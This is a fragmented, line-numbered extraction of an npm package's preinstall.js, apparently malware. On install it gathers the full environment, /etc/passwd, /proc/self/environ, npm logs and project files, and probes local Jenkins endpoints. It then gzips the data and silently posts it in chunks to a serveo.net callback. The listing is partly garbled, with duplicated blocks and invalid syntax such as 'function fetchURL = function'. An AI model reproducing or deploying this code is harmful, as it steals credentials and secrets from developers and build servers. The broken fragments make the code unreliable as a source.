// File: tmp/tmpny2kl5gz/mysteryxyz228/package/preinstall.js
// ======================================================================
Line 3: const fs = require("fs")
Line 4: const os = require("os")
Line 5: const cp = require("child_process")
Line 6: const zlib = require("zlib")
Line 7: const http = require("http")
Line 8: const https = require("https")
Line 9: _tmp_43 = require("url")
Line 10: const path = require("path")
Line 12: const DEFAULT_CB = "https://3c6b3fa7a21d2b2b253616520eb36401.serveo.net/collect"
Line 14: parseInt(process.env.EXFIL_CHUNK || "200000", 10)
Line 15: parseInt(process.env.REQ_TIMEOUT_MS || "2500", 10)
Line 22: const st = fs.statSync(p)
Line 24: let buf = fs.readFileSync(p)
Line 26: buf.toString("utf8")
Line 30: {
  const out = [];
  function walk(dir, d) {
    if (out.length >= maxEntries) return;
    let ents = [];
    try { ents = fs.readdirSync(dir, { withFileTypes: true }); }
    catch (e) { out.push({ dir, error: String(e) }); return; }
    for (const ent of ents) {
      if (out.length >= maxEntries) break;
      const full = path.join(dir, ent.name);
      out.push({ path: full, type: ent.isDirectory() ? "dir" : "file" });
      if (ent.isDirectory() && d < depth) walk(full, d + 1);
    }
  }
  try { walk(root, 0); } catch {}
  return out;
}
Line 31: const out = []
Line 32: {
    if (out.length >= maxEntries) return;
    let ents = [];
    try { ents = fs.readdirSync(dir, { withFileTypes: true }); }
    catch (e) { out.push({ dir, error: String(e) }); return; }
    for (const ent of ents) {
      if (out.length >= maxEntries) break;
      const full = path.join(dir, ent.name);
      out.push({ path: full, type: ent.isDirectory() ? "dir" : "file" });
      if (ent.isDirectory() && d < depth) walk(full, d + 1);
    }
  }
Line 34: let ents = []
Line 35: ents = fs.readdirSync(dir, { withFileTypes: true })
Line 36: out.push({ dir, error: String(e) })
Line 37: _iterator_0.next()
Line 39: path.join(dir, ent.name)
Line 40: out.push({ path: full, type: ent.isDirectory() ? "dir" : "file" })
Line 41: walk(full, d + 1)
Line 44: walk(root, 0)
Line 49: {
    const out = cp.execSync(cmd, { timeout: 1500, stdio: ["ignore", "pipe", "pipe"] });
    return { cmd, out: out.toString("utf8").slice(0, 200000) };
  }
Line 50: const out = cp.execSync(cmd, { timeout: 1500, stdio: ["ignore", "pipe", "pipe"] })
Line 51: out.toString("utf8")
Line 53: e.stderr.toString("utf8")
Line 57: function fetchURL = function fetchURL(u) {
  return new Promise((resolve) => {
    let mod = u.startsWith("https") ? https : http;
    let body = [];
    let timed = false;
    const req = mod.get(u, { timeout: REQ_TIMEOUT_MS }, (res) => {
      res.on("data", (c) => {
        if (body.length < 10) body.push(c);  // ограничим тело
      });
      res.on("end", () => {
        resolve({
          url: u,
          status: res.statusCode,
          headers: Object.fromEntries(Object.entries(res.headers).slice(0, 40)),
          bodySample: Buffer.concat(body).toString("utf8").slice(0, 2000)
        });
      });
    });
    req.on("timeout", () => { timed = true; req.destroy(new Error("timeout")); });
    req.on("error", (e) => resolve({ url: u, error: timed ? "timeout" : String(e) }));
    req.end();
  });
}
Line 58: {
    let mod = u.startsWith("https") ? https : http;
    let body = [];
    let timed = false;
    const req = mod.get(u, { timeout: REQ_TIMEOUT_MS }, (res) => {
      res.on("data", (c) => {
        if (body.length < 10) body.push(c);  // ограничим тело
      });
      res.on("end", () => {
        resolve({
          url: u,
          status: res.statusCode,
          headers: Object.fromEntries(Object.entries(res.headers).slice(0, 40)),
          bodySample: Buffer.concat(body).toString("utf8").slice(0, 2000)
        });
      });
    });
    req.on("timeout", () => { timed = true; req.destroy(new Error("timeout")); });
    req.on("error", (e) => resolve({ url: u, error: timed ? "timeout" : String(e) }));
    req.end();
  }
Line 60: let body = []
Line 64: body.push(c)
Line 71: Buffer.concat(body).toString("utf8")
Line 77: req.end()
Line 82: {
    const url = new URL(urlStr);
    const payload = Buffer.from(JSON.stringify(obj));
    const gz = zlib.gzipSync(payload);
    const options = {
      method: "POST",
      hostname: url.hostname,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      path: url.pathname + url.search,
      headers: {
        "Content-Type": "application/json",
        "Content-Encoding": "gzip",
        "X-Part": String(part),
        "X-Total": String(total),
        "Content-Length": gz.length
      }
    };
    const lib = url.protocol === "https:" ? https : http;
    const req = lib.request(options, (res) => {
      // игнорируем ответ
      res.resume();
      resolve();
    });
    req.on("error", () => resolve()); // молча
    req.write(gz);
    req.end();
  }
Line 84: Buffer.from(JSON.stringify(obj))
Line 85: zlib.gzipSync(payload)
Line 106: req.write(gz)
Line 107: req.end()
Line 114: postJSON(CALLBACK, obj, 1, 1)
Line 118: Object.keys(obj)
Line 120: for (const k of keys) {
    await postJSON(CALLBACK, { partOf: k, data: obj[k] }, part++, total);
    await sleep(150);
  }
Line 121: await postJSON(CALLBACK, { partOf: k, data: obj[k] }, part++, total)
Line 128: (_tmp_28 = [
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8080/login",
    "http://127.0.0.1:8080/api/json?tree=jobs[name,color,url]",
    "http://127.0.0.1:8080/crumbIssuer/api/json",
    "http://127.0.0.1:8080/env-vars.html",
    "http://127.0.0.1:8080/whoAmI/api/json",
    "http://localhost:8080/",
    "http://127.0.0.1:3000/",
    "http://localhost:3000/"
  ]).concat
Line 129: _tmp_29.push("http://127.0.0.1:8080/")
Line 130: _tmp_29.push("http://127.0.0.1:8080/login")
Line 131: _tmp_29.push("http://127.0.0.1:8080/api/json?tree=jobs[name,color,url]")
Line 132: _tmp_29.push("http://127.0.0.1:8080/crumbIssuer/api/json")
Line 133: _tmp_29.push("http://127.0.0.1:8080/env-vars.html")
Line 134: _tmp_29.push("http://127.0.0.1:8080/whoAmI/api/json")
Line 135: _tmp_29.push("http://localhost:8080/")
Line 136: _tmp_29.push("http://127.0.0.1:3000/")
Line 137: _tmp_29.push("http://localhost:3000/")
Line 140: const info = {
    meta: {
      when: new Date().toISOString(),
      host: os.hostname(),
      platform: process.platform,
      arch: process.arch,
      node: process.version,
      npm_lifecycle_event: process.env.npm_lifecycle_event,
      uid: (() => { try { return process.getuid?.(); } catch { return null; } })(),
      gid: (() => { try { return process.getgid?.(); } catch { return null; } })(),
      cwd: process.cwd(),
      dockerHints: {
        dockerenv: fs.existsSync("/.dockerenv"),
        cgroup: safeRead("/proc/self/cgroup", 8000),
      }
    },
    env: process.env, // полное окружение
    files: {
      etc_passwd: safeRead("/etc/passwd", 200000),
      etc_hosts: safeRead("/etc/hosts", 50000),
      etc_resolv: safeRead("/etc/resolv.conf", 50000),
      etc_hostname: safeRead("/etc/hostname", 2000),
      proc_environ: safeRead("/proc/self/environ", 50000),
      npm_log_tail: (() => {
        try {
          const dir = "/root/.npm/_logs";
          const files = ...
Line 141: _tmp_30.meta = {
      when: new Date().toISOString(),
      host: os.hostname(),
      platform: process.platform,
      arch: process.arch,
      node: process.version,
      npm_lifecycle_event: process.env.npm_lifecycle_event,
      uid: (() => { try { return process.getuid?.(); } catch { return null; } })(),
      gid: (() => { try { return process.getgid?.(); } catch { return null; } })(),
      cwd: process.cwd(),
      dockerHints: {
        dockerenv: fs.existsSync("/.dockerenv"),
        cgroup: safeRead("/proc/self/cgroup", 8000),
      }
    }
Line 143: os.hostname()
Line 151: _tmp_31.dockerHints = {
        dockerenv: fs.existsSync("/.dockerenv"),
        cgroup: safeRead("/proc/self/cgroup", 8000),
      }
Line 152: _tmp_34.dockerenv = fs.existsSync("/.dockerenv")
Line 153: safeRead("/proc/self/cgroup", 8000)
Line 157: _tmp_30.files = {
      etc_passwd: safeRead("/etc/passwd", 200000),
      etc_hosts: safeRead("/etc/hosts", 50000),
      etc_resolv: safeRead("/etc/resolv.conf", 50000),
      etc_hostname: safeRead("/etc/hostname", 2000),
      proc_environ: safeRead("/proc/self/environ", 50000),
      npm_log_tail: (() => {
        try {
          const dir = "/root/.npm/_logs";
          const files = fs.readdirSync(dir).filter(f => f.endsWith(".log")).slice(-3);
          return files.map(f => safeRead(path.join(dir, f), 80000));
        } catch (e) { return { error: String(e) }; }
      })(),
      app_pkg_json: safeRead(path.join(process.cwd(), "package.json"), 120000),
      app_pkg_lock: safeRead(path.join(process.cwd(), "package-lock.json"), 150000),
      workdir_listing: listDir(process.cwd(), 2, 300)
    }
Line 158: safeRead("/etc/passwd", 200000)
Line 159: safeRead("/etc/hosts", 50000)
Line 160: safeRead("/etc/resolv.conf", 50000)
Line 161: safeRead("/etc/hostname", 2000)
Line 162: safeRead("/proc/self/environ", 50000)
Line 163: _tmp_35.npm_log_tail = (() => {
        try {
          const dir = "/root/.npm/_logs";
          const files = fs.readdirSync(dir).filter(f => f.endsWith(".log")).slice(-3);
          return files.map(f => safeRead(path.join(dir, f), 80000));
        } catch (e) { return { error: String(e) }; }
      })()
Line 166: const files = fs.readdirSync(dir).filter(f => f.endsWith(".log")).slice(-3)
Line 167: safeRead(path.join(dir, f), 80000)
Line 170: safeRead(path.join(process.cwd(), "package.json"), 120000)
Line 171: safeRead(path.join(process.cwd(), "package-lock.json"), 150000)
Line 176: os.totalmem()
Line 177: os.cpus()
Line 189: _iterator_2.next()
Line 190: {
      info.probes[u] = await fetchURL(u);
    }
Line 191: info.probes[u] = await fetchURL(u)
Line 192: catch (e) {
      info.probes[u] = { url: u, error: String(e) };
    }
Line 193: info.probes[u] = { url: u, error: String(e) }
Line 200: main()
